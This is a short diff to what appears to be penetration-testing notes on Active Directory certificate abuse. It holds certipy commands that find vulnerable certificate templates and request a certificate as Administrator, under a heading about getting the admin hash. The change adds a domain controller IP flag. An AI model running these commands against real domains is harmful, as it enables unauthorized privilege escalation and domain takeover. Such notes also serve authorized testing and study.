@@ -25,7 +25,7 @@ certipy find -u $USER -p $PASS -dc-ip $TARGET_IP -vulnerable -stdout -text
 ```
 request enrollment of user in template:
 ```shell
-certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN -debug
+certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN -dc-ip $TARGET_IP -debug
 ```
 exploit to get admin hash:
 ```shell
